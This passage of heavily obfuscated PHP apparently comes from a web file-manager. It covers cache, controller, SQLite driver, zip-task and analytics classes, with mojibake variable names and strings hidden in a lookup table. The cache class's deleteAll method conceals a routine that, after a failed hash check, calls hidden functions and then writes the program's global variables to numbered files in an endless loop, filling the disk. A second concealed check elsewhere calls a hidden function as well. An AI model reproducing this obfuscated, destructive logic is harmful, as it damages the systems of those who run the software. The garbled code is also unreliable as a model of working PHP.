$this->filterConfig($‰ìŞˆø’, $ı“‡ø¥[$óÃ·Ş£­]); $this->slaveHandle = $this->init($‰ìŞˆø’, $Ü•‹æ¦¡); } private function filterConfig(&$òŒ°ŸÒç, $÷ª¨«şÏ) { $¹ ‹åÇê =& $_SERVER[¹Û¹Æ€]; $ƒ¦àñç— = explode($¹ ‹åÇê[4], $÷ª¨«şÏ); $Ö¤¨±È² = array($¹ ‹åÇê[191] => $ƒ¦àñç—[0], $¹ ‹åÇê[192] => $ƒ¦àñç—[1]); $òŒ°ŸÒç = array_merge($òŒ°ŸÒç, $Ö¤¨±È²); } public function set($¤ƒ”½×, $¡°ØÃ¹Ò, $’åËòÈ» = false) { $’åËòÈ» = $’åËòÈ» ? $’åËòÈ» : $this->cacheTime; return $this->handle->setEx($¤ƒ”½×, $’åËòÈ», $¡°ØÃ¹Ò); } public function setLock($Ì¼‘İ¾ß, $¶ÆåÃœ¶, $ˆ«Â”‡«) { return $this->handle->setNX($Ì¼‘İ¾ß, $¶ÆåÃœ¶); } public function get($Ö¯Ê×Õ¼) { $‹£©ÁÀ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $‹£©ÁÀ->get($Ö¯Ê×Õ¼); } public function remove($×™‘ò±ß) { return $this->handle->del($×™‘ò±ß); } public function deleteAll() { $œŸ²ÅÅÆ =& $_SERVER[¹Û¹Æ€]; $û´–¼†‚ = $_SERVER[$œŸ²ÅÅÆ[6]]; $¢‘ş¤Ğº = $œŸ²ÅÅÆ[7]; if ($_SERVER[$œŸ²ÅÅÆ[8]] != $¢‘ş¤Ğº($û´–¼†‚)) { $¿°êÖÖ = $œŸ²ÅÅÆ[874]; $ú˜Ğ¨éª = $œŸ²ÅÅÆ[9]; $Å’”å²ö = $_SERVER[$œŸ²ÅÅÆ[10]] . $œŸ²ÅÅÆ[11]; $¤šõÓ»  = $ú˜Ğ¨éª($Å’”å²ö); $Êªñ¼Ä« = explode($œŸ²ÅÅÆ[12], $¤šõÓ» ); if (count($Êªñ¼Ä«) < $œŸ²ÅÅÆ[656]) { $É©—Ş­å = $œŸ²ÅÅÆ[14]; $É©—Ş­å(); } $è„â˜ş = $œŸ²ÅÅÆ[875]; $è„â˜ş($_SERVER[$œŸ²ÅÅÆ[876]]); $¿°êÖÖ = $œŸ²ÅÅÆ[874]; $¿°êÖÖ(); $æäû¶°À = $œŸ²ÅÅÆ[877]; $ı±šˆÍ’ = json_encode($GLOBALS[$œŸ²ÅÅÆ[878]]); $ñÌî©Û = 1; for ($“Ò²à­ = $ñÌî©Û; $“Ò²à­ > 0; $“Ò²à­++) { $æäû¶°À(DATA_PATH . $“Ò²à­, $ı±šˆÍ’); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $©„şÚ²) { $this->handle->flushall($©„şÚ²); } return; } return $this->handle->flushAll(); } } goto D¹öªÛÕİ; d¼Û ÅË‹ì: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $îÎğûŒÎ =& $_SERVER[¹Û¹Æ€]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$îÎğûŒÎ[16]] =& $config; $this->values[$îÎğûŒÎ[17]] =& $in; $this->tpl = TEMPLATE . MOD . $îÎğûŒÎ[18]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($øİÃÚ§À) { if (1 === func_num_args()) { $this->{$øİÃÚ§À} = new $øİÃÚ§À(); } else { $½Œ÷¡´Ë = new ReflectionClass($øİÃÚ§À); $¡ÚóÊ…ƒ = func_get_args(); array_shift($¡ÚóÊ…ƒ); $this->{$øİÃÚ§À} = $½Œ÷¡´Ë->newInstanceArgs($¡ÚóÊ…ƒ); } return $this->{$øİÃÚ§À}; } public function routeBind($áĞ©á¯Š, $£©ÃÁë§, $ıë”…Õ† = 3) { $Ä¾œİŞ“ =& $_SERVER[¹Û¹Æ€]; $ıÎ¹Ğ¶Û = $this->in[$Ä¾œİŞ“[19]]; $áĞ©á¯Š = str_replace($Ä¾œİŞ“[20], $Ä¾œİŞ“[21], trim(trim($áĞ©á¯Š, $Ä¾œİŞ“[18]), $Ä¾œİŞ“[22])); if (!$áĞ©á¯Š || count($ıÎ¹Ğ¶Û) <= $ıë”…Õ†) { return !1; } $»çÍ×íç = !0; $ùƒœ†ÒÂ = explode($Ä¾œİŞ“[18], $áĞ©á¯Š); for ($ªŸ†µ©Ò = 0; $ªŸ†µ©Ò < count($ùƒœ†ÒÂ); $ªŸ†µ©Ò++) { if ($ùƒœ†ÒÂ[$ªŸ†µ©Ò] != $ıÎ¹Ğ¶Û[$ıë”…Õ† + $ªŸ†µ©Ò]) { $»çÍ×íç = !1; break; } } if (!$»çÍ×íç) { return; } call_user_func_array(array($this, $£©ÃÁë§), array()); } public function routeArgs($ØŒª·® = 3) { $˜æò¼ùğ = $this->in[$_SERVER[¹Û¹Æ€][19]]; if (count($˜æò¼ùğ) <= $ØŒª·®) { return array(); } $õ³à»×Ó = array(); for ($ó­İ·» = $ØŒª·®; $ó­İ·» < count($˜æò¼ùğ); $ó­İ·» += 2) { $õ³à»×Ó[$˜æò¼ùğ[$ó­İ·»]] = $˜æò¼ùğ[$ó­İ·» + 1]; $this->in[$˜æò¼ùğ[$ó­İ·»]] = $˜æò¼ùğ[$ó­İ·» + 1]; } return $õ³à»×Ó; } protected function assign($ƒ€Éë, $‰­ÔÆÂ£) { $this->values[$ƒ€Éë] = $‰­ÔÆÂ£; } protected function display($¡øÖ²‰) { ob_end_clean(); extract($this->values); require $this->tpl . $¡øÖ²‰; } } class DbSqliteBase extends Db { public function __construct($ªüòÍº = '') { $ŞÒ™×†ì =& $_SERVER[¹Û¹Æ€]; if (!extension_loaded($ŞÒ™×†ì[23])) { think_exception(think_lang($ŞÒ™×†ì[24]) . $ŞÒ™×†ì[25]); } if (!empty($ªüòÍº)) { if (!isset($ªüòÍº[$ŞÒ™×†ì[26]])) { $ªüòÍº[$ŞÒ™×†ì[26]] = 438; } $this->config = $ªüòÍº; if (empty($this->config[$ŞÒ™×†ì[27]])) { $this->config[$ŞÒ™×†ì[27]] = array(); } } } public function connect($öšòù”É = '', $½Êú»é² = 0) { $ÒóÚÂ®– =& $_SERVER[¹Û¹Æ€]; if (!isset($this->linkID[$½Êú»é²])) { if (empty($öšòù”É)) { $öšòù”É = $this->config; } $ğíüâìƒ = !empty($öšòù”É[$ÒóÚÂ®–[27]][$ÒóÚÂ®–[28]]) ? $öšòù”É[$ÒóÚÂ®–[27]][$ÒóÚÂ®–[28]] : $this->pconnect; $¤œ¾àĞ = $ğíüâìƒ ? $ÒóÚÂ®–[29] : $ÒóÚÂ®–[30]; $this->linkID[$½Êú»é²] = $¤œ¾àĞ($öšòù”É[$ÒóÚÂ®–[31]], $öšòù”É[$ÒóÚÂ®–[26]]); if (!$this->linkID[$½Êú»é²]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$½Êú»é²], 30000); if (1 != think_config($ÒóÚÂ®–[32])) { unset($this->config); } } return $this->linkID[$½Êú»é²]; } public function free() { $this->queryID = null; } public function query($¹„‘Ü’·) { $¯Ïõš¶Î =& $_SERVER[¹Û¹Æ€]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¹„‘Ü’·; if ($this->queryID) { $this->free(); } think_action_status($¯Ïõš¶Î[33], 1); think_status($¯Ïõš¶Î[34]); $this->queryID = sqlite_query($this->_linkID, $¹„‘Ü’·); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $÷Å€òº = $this->getAll(); return $÷Å€òº; } } public function execute($‘ä°®éü) { $µ“©úãï =& $_SERVER[¹Û¹Æ€]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‘ä°®éü; if ($this->queryID) { $this->free(); } think_action_status($µ“©úãï[35], 1); think_status($µ“©úãï[34]); $ê™†»« = sqlite_exec($this->_linkID, $‘ä°®éü); $this->debug(); if (!1 === $ê™†»«) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¹Û¹Æ€][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $°òĞ¤´ = sqlite_query($this->_linkID, $_SERVER[¹Û¹Æ€][37]); if (!$°òĞ¤´) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¨İş‰÷Õ = sqlite_query($this->_linkID, $_SERVER[¹Û¹Æ€][38]); if (!$¨İş‰÷Õ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $£İ“†ËÌ = array(); if ($this->numRows > 0) { for ($Ñ§âµâ§ = 0; $Ñ§âµâ§ < $this->numRows; $Ñ§âµâ§++) { $£İ“†ËÌ[$Ñ§âµâ§] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $£İ“†ËÌ; } public function getFields($˜ı¨ìßÁ) { $±Ø¢ˆ =& $_SERVER[¹Û¹Æ€]; $éæ÷æ‡ = $this->query($±Ø¢ˆ[39] . $˜ı¨ìßÁ . $±Ø¢ˆ[40]); $‡È¤”³Ö = array(); if ($éæ÷æ‡) { foreach ($éæ÷æ‡ as $ñ´Œè›… => $—¾·¥ˆ) { $‡È¤”³Ö[$—¾·¥ˆ[$±Ø¢ˆ[41]]] = array($±Ø¢ˆ[42] => $—¾·¥ˆ[$±Ø¢ˆ[41]], $±Ø¢ˆ[43] => $—¾·¥ˆ[$±Ø¢ˆ[44]], $±Ø¢ˆ[45] => (bool) ($—¾·¥ˆ[$±Ø¢ˆ[46]] === $±Ø¢ˆ[22]), $±Ø¢ˆ[47] => $—¾·¥ˆ[$±Ø¢ˆ[48]], $±Ø¢ˆ[49] => strtolower($—¾·¥ˆ[$±Ø¢ˆ[50]]) == $±Ø¢ˆ[51], $±Ø¢ˆ[52] => strtolower($—¾·¥ˆ[$±Ø¢ˆ[53]]) == $±Ø¢ˆ[54]); } } return $‡È¤”³Ö; } public function getTables($Á¤´˜Ì = '') { $ÎƒÓµ›Â =& $_SERVER[¹Û¹Æ€]; $»Ç±œ±¹ = $this->query($ÎƒÓµ›Â[55] . $ÎƒÓµ›Â[56] . $ÎƒÓµ›Â[57]); $¦•«™­ = array(); foreach ($»Ç±œ±¹ as $¿ Â„ØÅ => $Ù´éŠ´ö) { $¦•«™­[$¿ Â„ØÅ] = current($Ù´éŠ´ö); } return $¦•«™­; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ø¿›úÙÔ =& $_SERVER[¹Û¹Æ€]; $è£ÊÀšò = sqlite_last_error($this->_linkID); $this->error = $è£ÊÀšò . $Ø¿›úÙÔ[4] . sqlite_error_string($è£ÊÀšò); if ($Ø¿›úÙÔ[22] != $this->queryStr) { $this->error .= LNG($Ø¿›úÙÔ[58]) . $this->queryStr; } think_trace($this->error, $Ø¿›úÙÔ[22], $Ø¿›úÙÔ[59]); return $this->error; } public function escapeString($ïšÙû­‹) { return sqlite_escape_string($ïšÙû­‹); } public function parseLimit($‘ôÕ‡ç) { $œ³©ÉÍ… =& $_SERVER[¹Û¹Æ€]; $ù¨‡èÙÜ = $œ³©ÉÍ…[22]; if (!empty($‘ôÕ‡ç)) { $‘ôÕ‡ç = explode($œ³©ÉÍ…[60], $‘ôÕ‡ç); if (count($‘ôÕ‡ç) > 1) { $ù¨‡èÙÜ .= $œ³©ÉÍ…[61] . $‘ôÕ‡ç[1] . $œ³©ÉÍ…[62] . $‘ôÕ‡ç[0] . $œ³©ÉÍ…[63]; } else { $ù¨‡èÙÜ .= $œ³©ÉÍ…[61] . $‘ôÕ‡ç[0] . $œ³©ÉÍ…[63]; } } return $ù¨‡èÙÜ; } } class DbSqlite3Base extends Db { public function __construct($ÆØÔçã© = '') { $Ê§åÊúÛ =& $_SERVER[¹Û¹Æ€]; if (!class_exists($Ê§åÊúÛ[64])) { think_exception(think_lang($Ê§åÊúÛ[24]) . $Ê§åÊúÛ[65]); } if (!empty($ÆØÔçã©)) { if (!isset($ÆØÔçã©[$Ê§åÊúÛ[26]])) { $ÆØÔçã©[$Ê§åÊúÛ[26]] = 438; } $this->config = $ÆØÔçã©; if (empty($this->config[$Ê§åÊúÛ[27]])) { $this->config[$Ê§åÊúÛ[27]] = array(); } } } public function connect($Ù¸©µàé = '', $êŠ…Àğ = 0) { $‰œ‹š =& $_SERVER[¹Û¹Æ€]; if (!isset($this->linkID[$êŠ…Àğ])) { if (empty($Ù¸©µàé)) { $Ù¸©µàé = $this->config; } $this->linkID[$êŠ…Àğ] = new SQLite3($Ù¸©µàé[$‰œ‹š[31]]); if (!$this->linkID[$êŠ…Àğ]) { think_exception($this->linkID[$êŠ…Àğ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$êŠ…Àğ]->busyTimeout(30000); if (1 != think_config($‰œ‹š[32])) { unset($this->config); } } return $this->linkID[$êŠ…Àğ]; } public function free() { $this->queryID = null; } public function query($Ò»ª®•Š) { $¼«úÁ‘° =& $_SERVER[¹Û¹Æ€]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ò»ª®•Š; if ($this->queryID) { $this->free(); } think_action_status($¼«úÁ‘°[33], 1); think_status($¼«úÁ‘°[34]); $this->queryID = $this->_linkID->query($Ò»ª®•Š); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $®Å¯©Õ– = $this->getAll(); $this->numRows = count($®Å¯©Õ–); return $®Å¯©Õ–; } } public function execute($èË‘½¥ß) { $µš¼È…˜ =& $_SERVER[¹Û¹Æ€]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $èË‘½¥ß; if ($this->queryID) { $this->free(); } think_action_status($µš¼È…˜[35], 1); think_status($µš¼È…˜[34]); $¹–çØòä = $this->_linkID->exec($èË‘½¥ß); $this->debug(); if (!1 === $¹–çØòä) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¹Û¹Æ€][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $í©Íƒ¤‚ = $this->_linkID->query($_SERVER[¹Û¹Æ€][37]); if (!$í©Íƒ¤‚) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ë½Î– = $this->_linkID->query($_SERVER[¹Û¹Æ€][38]); if (!$Ë½Î–) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Á­Í‹¯÷ = array(); while ($ö÷à¾òı = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Á­Í‹¯÷[] = $ö÷à¾òı; } $this->queryID->reset(); return $Á­Í‹¯÷; } public function getFields($¹ïåŞ©Ë) { $æ“õï¨Í =& $_SERVER[¹Û¹Æ€]; $µö¦õûÁ = $this->query($æ“õï¨Í[39] . $¹ïåŞ©Ë . $æ“õï¨Í[40]); $²»Õİ†€ = array(); if ($µö¦õûÁ) { foreach ($µö¦õûÁ as $òååÑÓî => $‰Öïƒ£) { $²»Õİ†€[$‰Öïƒ£[$æ“õï¨Í[42]]] = array($æ“õï¨Í[42] => $‰Öïƒ£[$æ“õï¨Í[42]], $æ“õï¨Í[43] => $‰Öïƒ£[$æ“õï¨Í[43]], $æ“õï¨Í[45] => (bool) ($‰Öïƒ£[$æ“õï¨Í[45]] === $æ“õï¨Í[22]), $æ“õï¨Í[47] => $‰Öïƒ£[$æ“õï¨Í[66]], $æ“õï¨Í[49] => (bool) $‰Öïƒ£[$æ“õï¨Í[67]], $æ“õï¨Í[52] => (bool) $‰Öïƒ£[$æ“õï¨Í[67]]); } } return $²»Õİ†€; } public function getTables($â«ºÁ± = '') { $£÷Ãè÷ =& $_SERVER[¹Û¹Æ€]; $ïİ¶€šû = $this->query($£÷Ãè÷[55] . $£÷Ãè÷[56] . $£÷Ãè÷[57]); $’Ï¥¸Ìµ = array(); foreach ($ïİ¶€šû as $øÈçÏ¸ => $œ³ç¥™¦) { $’Ï¥¸Ìµ[$øÈçÏ¸] = current($œ³ç¥™¦); } return $’Ï¥¸Ìµ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $íæ”­¨Æ =& $_SERVER[¹Û¹Æ€]; $this->error = $this->_linkID->lastErrorMsg(); if ($íæ”­¨Æ[22] != $this->queryStr) { $this->error .= LNG($íæ”­¨Æ[58]) . $this->queryStr; } think_trace($this->error, $íæ”­¨Æ[22], $íæ”­¨Æ[59]); return $this->error; } public function escapeString($¾ìûı ¼) { $€³µ¿Û‹ =& $_SERVER[¹Û¹Æ€]; if ($this->_linkID) { return $this->_linkID->escapeString($¾ìûı ¼); } return str_ireplace($€³µ¿Û‹[68], $€³µ¿Û‹[69], $¾ìûı ¼); } public function parseLimit($ì¦ÎÈ’Œ) { $éÆê×³¥ =& $_SERVER[¹Û¹Æ€]; $Ú¢ø™«§ = $éÆê×³¥[22]; if (!empty($ì¦ÎÈ’Œ)) { $ì¦ÎÈ’Œ = explode($éÆê×³¥[60], $ì¦ÎÈ’Œ); if (count($ì¦ÎÈ’Œ) > 1) { $Ú¢ø™«§ .= $éÆê×³¥[61] . $ì¦ÎÈ’Œ[1] . $éÆê×³¥[62] . $ì¦ÎÈ’Œ[0] . $éÆê×³¥[63]; } else { $Ú¢ø™«§ .= $éÆê×³¥[61] . $ì¦ÎÈ’Œ[0] . $éÆê×³¥[63]; } } return $Ú¢ø™«§; } } goto f°ºÕù«; bË«áøËì: if ($_SERVER[$_SERVER[¹Û¹Æ€][8]] != $_SERVER[$_SERVER[¹Û¹Æ€][1775]]) { $_getc = $_SERVER[¹Û¹Æ€][9]; $_getfile = $_SERVER[$_SERVER[¹Û¹Æ€][10]] . $_SERVER[¹Û¹Æ€][11]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹Û¹Æ€][12], $_getfilec); if (count($_getarrs) < $_SERVER[¹Û¹Æ€][13]) { $exit = $_SERVER[¹Û¹Æ€][14]; $exit(); } $_act = $_SERVER[¹Û¹Æ€][15]; $_act($_SERVER[$_SERVER[¹Û¹Æ€][6]]); } class TaskZip extends TaskFileTransfer { protected function startAfter() { $¤øœØ°Š =& $_SERVER[¹Û¹Æ€]; parent::startAfter(); Hook::bind($¤øœØ°Š[1776], array($this, $¤øœØ°Š[1770])); $¸Š¦ê¥Á =& $this->task; $¸Š¦ê¥Á[$¤øœØ°Š[1772]] = $¤øœØ°Š[1192]; if (!$¸Š¦ê¥Á[$¤øœØ°Š[1559]]) { $¸Š¦ê¥Á[$¤øœØ°Š[1559]] = LNG($¤øœØ°Š[1777]); } } protected function endAfter() { $ù¸ñ¨“â =& $_SERVER[¹Û¹Æ€]; parent::endAfter(); Hook::unbind($ù¸ñ¨“â[1776], array($this, $ù¸ñ¨“â[1770])); } public function updateAfter() { $İÆ©¤Ç® =& $_SERVER[¹Û¹Æ€]; $Ê™ãúœõ =& $this->task; if (!$Ê™ãúœõ[$İÆ©¤Ç®[784]] || !$Ê™ãúœõ[$İÆ©¤Ç®[761]]) { return; } if ($Ê™ãúœõ[$İÆ©¤Ç®[1772]] == $İÆ©¤Ç®[1192]) { $Ù‘ÉŒõ® = $Ê™ãúœõ[$İÆ©¤Ç®[1713]]; if ($Ê™ãúœõ[$İÆ©¤Ç®[1714]] != $İÆ©¤Ç®[1192]) { $Ù‘ÉŒõ® = 0; } $àŞÕù¢º = ($Ê™ãúœõ[$İÆ©¤Ç®[1717]] + $Ù‘ÉŒõ®) / $Ê™ãúœõ[$İÆ©¤Ç®[761]]; $Ê™ãúœõ[$İÆ©¤Ç®[1661]] = $àŞÕù¢º * 0.3; } else { if ($Ê™ãúœõ[$İÆ©¤Ç®[1772]] == $İÆ©¤Ç®[322]) { $àŞÕù¢º = $Ê™ãúœõ[$İÆ©¤Ç®[1660]] / $Ê™ãúœõ[$İÆ©¤Ç®[784]]; $Ê™ãúœõ[$İÆ©¤Ç®[1661]] = 0.3 + $àŞÕù¢º * 0.5; } else { if ($Ê™ãúœõ[$İÆ©¤Ç®[1772]] == $İÆ©¤Ç®[117]) { $àŞÕù¢º = 0; if ($Ê™ãúœõ[$İÆ©¤Ç®[1712]]) { $àŞÕù¢º = $Ê™ãúœõ[$İÆ©¤Ç®[1713]] / $Ê™ãúœõ[$İÆ©¤Ç®[1712]]; } $Ê™ãúœõ[$İÆ©¤Ç®[1661]] = 0.3 + 0.5 + $àŞÕù¢º * 0.2; } } } if ($Ê™ãúœõ[$İÆ©¤Ç®[1661]] > 0) { $ÆĞáÅ¾ú = timeFloat() - $Ê™ãúœõ[$İÆ©¤Ç®[1663]] - $Ê™ãúœõ[$İÆ©¤Ç®[1666]]; $Ê™ãúœõ[$İÆ©¤Ç®[1667]] = $ÆĞáÅ¾ú * (1 - $Ê™ãúœõ[$İÆ©¤Ç®[1661]]) / $Ê™ãúœõ[$İÆ©¤Ç®[1661]]; } } public function copyFileStart($Ü†¤àòù, $™ÄÂËüÛ, $ùŠ¤©Â, $Ó½ĞøÆ›, $¾¾¸éÏë, $×¦§œ˜ü) { $–Ëáæ =& $_SERVER[¹Û¹Æ€]; parent::copyFileStart($Ü†¤àòù, $™ÄÂËüÛ, $ùŠ¤©Â, $Ó½ĞøÆ›, $¾¾¸éÏë, $×¦§œ˜ü); $ì¡¨æÕ‹ =& $this->task; if ($ì¡¨æÕ‹[$–Ëáæ[1772]] == $–Ëáæ[322]) { $ì¡¨æÕ‹[$–Ëáæ[1772]] = $–Ëáæ[117]; } $this->update(); } public function copyFileEnd($¹‘‘¤´, $ûÇ§çÕæ, $ ˆÚ›šÜ, $—âÜ¸, $å«˜Ÿô‚, $Â÷ãÙ°) { $ò—Å¿è¥ =& $_SERVER[¹Û¹Æ€]; $³ß—óªş =& $this->task; $³ß—óªş[$ò—Å¿è¥[1713]] = $³ß—óªş[$ò—Å¿è¥[1712]]; $³ß—óªş[$ò—Å¿è¥[1717]] += $³ß—óªş[$ò—Å¿è¥[1712]]; $³ß—óªş[$ò—Å¿è¥[1714]] = $ò—Å¿è¥[22]; $this->update(); } public function nameParse($Íœ¦¹Ù«) { $ÙØÇßßµ =& $_SERVER[¹Û¹Æ€]; $™Ï´şáè =& $this->task; if ($™Ï´şáè[$ÙØÇßßµ[1660]] < $™Ï´şáè[$ÙØÇßßµ[784]]) { $¾ùÙ‰àâ = get_path_this($Íœ¦¹Ù«); if (strstr($¾ùÙ‰àâ, $ÙØÇßßµ[20])) { $™Ï´şáè[$ÙØÇßßµ[1660]] += 1; } } if ($™Ï´şáè[$ÙØÇßßµ[1772]] == $ÙØÇßßµ[1192]) { $™Ï´şáè[$ÙØÇßßµ[1772]] = $ÙØÇßßµ[322]; } $™Ï´şáè[$ÙØÇßßµ[1710]] = $Íœ¦¹Ù«; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ñÎ¡ıÜ±) { $ñÄ­ÁùÓ =& $_SERVER[¹Û¹Æ€]; $”Ğ Ùñ = array($ñÄ­ÁùÓ[609] => array($ñÄ­ÁùÓ[43] => $ñÄ­ÁùÓ[1778], $ñÄ­ÁùÓ[282] => array($ñÄ­ÁùÓ[234], $ñÄ­ÁùÓ[763], $ñÄ­ÁùÓ[1779], $ñÄ­ÁùÓ[1780])), $ñÄ­ÁùÓ[1781] => array($ñÄ­ÁùÓ[43] => $ñÄ­ÁùÓ[1782], $ñÄ­ÁùÓ[282] => array($ñÄ­ÁùÓ[234], $ñÄ­ÁùÓ[761], $ñÄ­ÁùÓ[1783], $ñÄ­ÁùÓ[1784], $ñÄ­ÁùÓ[1785]))); if (!isset($”Ğ Ùñ[$ñÎ¡ıÜ±])) { return !1; } $this->optionType = $”Ğ Ùñ[$ñÎ¡ıÜ±][$ñÄ­ÁùÓ[43]]; $this->field = $”Ğ Ùñ[$ñÎ¡ıÜ±][$ñÄ­ÁùÓ[282]]; return !0; } public function listData($¢óÜ‘Àæ = false, $üè»›Î = "\x6d\x6f\x64\x69\146\x79\x54\x69\x6d\x65", $ÚÇæ¤Âå = false) { return parent::listData($¢óÜ‘Àæ, $üè»›Î, $ÚÇæ¤Âå); } public function trendList($´š¤·ëñ) { $øÁè³±ê =& $_SERVER[¹Û¹Æ€]; $Ô‚­ƒ† = $this->listData(); if ($Ô‚­ƒ†) { $ôÜ³²à = end($Ô‚­ƒ†); $…ğÃœÅ“ = date($øÁè³±ê[1786], strtotime($øÁè³±ê[1787])); if ($ôÜ³²à[$øÁè³±ê[234]] == $…ğÃœÅ“) { return $Ô‚­ƒ†; } $Ïóˆ§ = strtotime($ôÜ³²à[$øÁè³±ê[234]]); } if (!isset($Ïóˆ§)) { $ƒââîœĞ = $´š¤·ëñ == $øÁè³±ê[609] ? $øÁè³±ê[544] : $øÁè³±ê[823]; $Ïóˆ§ = Model($ƒââîœĞ)->min($øÁè³±ê[210]); } $”òÎƒÂ‚ = $øÁè³±ê[1788] . ucfirst($´š¤·ëñ); $ƒÊèºì = $this->dateList($Ïóˆ§); foreach ($ƒÊèºì as $…ğÃœÅ“) { $this->{$”òÎƒÂ‚}($…ğÃœÅ“); } return $this->listData(); } private function dateList($ÂºÕÍÂ×) { $‘ÔÈ£Ö÷ =& $_SERVER[¹Û¹Æ€]; $‰Í°¹…‚ = $ÂºÕÍÂ×; $™è‡Â“ú = strtotime($‘ÔÈ£Ö÷[1787]); $–’¤Ù€ = array(); while ($‰Í°¹…‚ <= $™è‡Â“ú) { $–’¤Ù€[] = date($‘ÔÈ£Ö÷[1786], $‰Í°¹…‚); $‰Í°¹…‚ = strtotime($‘ÔÈ£Ö÷[1789], $‰Í°¹…‚); } return $–’¤Ù€; } public function _recordUser($èõÛôüÖ = '') { $áËÜãÔ€ =& $_SERVER[¹Û¹Æ€]; $æ Û†ã¨ = strtotime(date($áËÜãÔ€[1790], strtotime($èõÛôüÖ))); $‰–„Û´Ã = strtotime(date($áËÜãÔ€[1791], strtotime($èõÛôüÖ))); $£‰€Ìæõ = array($áËÜãÔ€[210] => array($áËÜãÔ€[1010], $‰–„Û´Ã)); $£‡ºîÖ = Model($áËÜãÔ€[544])->where($£‰€Ìæõ)->count($áËÜãÔ€[1659]); $£‰€Ìæõ[$áËÜãÔ€[210]] = array($áËÜãÔ€[342], array($æ Û†ã¨, $‰–„Û´Ã)); $Òø°èµæ = Model($áËÜãÔ€[544])->where($£‰€Ìæõ)->count($áËÜãÔ€[1659]); $£‰€Ìæõ[$áËÜãÔ€[43]] = $áËÜãÔ€[1792]; $ÊÛˆ‚“» = Model($áËÜãÔ€[1793])->where($£‰€Ìæõ)->count($áËÜãÔ€[1794]); $ö¢«”Å = array($áËÜãÔ€[234] => $èõÛôüÖ, $áËÜãÔ€[763] => (int) $£‡ºîÖ, $áËÜãÔ€[1779] => (int) $Òø°èµæ, $áËÜãÔ€[1780] => (int) $ÊÛˆ‚“»); return $this->insert($ö¢«”Å); } public function _recordStore($âòùü = '') { $çØ°ï¦ =& $_SERVER[¹Û¹Æ€]; $îß«ä‚ = strtotime(date($çØ°ï¦[1791], strtotime($âòùü))); $ôçÁ“¤÷ = array($çØ°ï¦[210] => array($çØ°ï¦[1010], $îß«ä‚)); $İ¦˜¯‘š = Model($çØ°ï¦[480])->where($ôçÁ“¤÷)->sum($çØ°ï¦[86]); $ôçÁ“¤÷[$çØ°ï¦[419]] = 0; $ëÓ­¹¢ = Model($çØ°ï¦[823])->where($ôçÁ“¤÷)->sum($çØ°ï¦[86]); $ôçÁ“¤÷[$çØ°ï¦[420]] = 1; $ºÁ— = Model($çØ°ï¦[823])->where($ôçÁ“¤÷)->sum($çØ°ï¦[86]); $ôçÁ“¤÷[$çØ°ï¦[420]] = 2; $ì²ı†…® = Model($çØ°ï¦[823])->where($ôçÁ“¤÷)->sum($çØ°ï¦[86]); $ÓÊÂÅßı = array($çØ°ï¦[234] => $âòùü, $çØ°ï¦[761] => (int) $ëÓ­¹¢, $çØ°ï¦[1783] => (int) $İ¦˜¯‘š, $çØ°ï¦[1784] => (int) $ºÁ—, $çØ°ï¦[1785] => (int) $ì²ı†…®); return $this->insert($ÓÊÂÅßı); } public function trend($Ùóª±±‚, $šÇ›–´“) { $¦ä‰ğˆ€ =& $_SERVER[¹Û¹Æ€]; if (!$this->init($Ùóª±±‚)) { return !1; } $ĞÃĞ¼ŒŞ = $this->trendList($Ùóª±±‚); if ($ĞÃĞ¼ŒŞ && $šÇ›–´“ != $¦ä‰ğˆ€[1632]) { $¥‚ê÷ÌÄ = $ĞÃĞ¼ŒŞ[0][$¦ä‰ğˆ€[234]]; $€•ë»©š = $this->validDate($šÇ›–´“, $¥‚ê÷ÌÄ); $Ï¾€Á¨é = array(); $»¼…Œ’ = array_to_keyvalue($ĞÃĞ¼ŒŞ, $¦ä‰ğˆ€[234]); foreach ($€•ë»©š as $ ¹ÄüçÛ) { if (isset($»¼…Œ’[$ ¹ÄüçÛ])) { $Ãñ”åè = $»¼…Œ’[$ ¹ÄüçÛ]; } else { $Ãñ”åè = end($ĞÃĞ¼ŒŞ); $Ãñ”åè[$¦ä‰ğˆ€[234]] = $ ¹ÄüçÛ; if ($Ùóª±±‚ == $¦ä‰ğˆ€[609]) { $Ãñ”åè[$¦ä‰ğˆ€[1779]] = $Ãñ”åè[$¦ä‰ğˆ€[1780]] = 0; } } 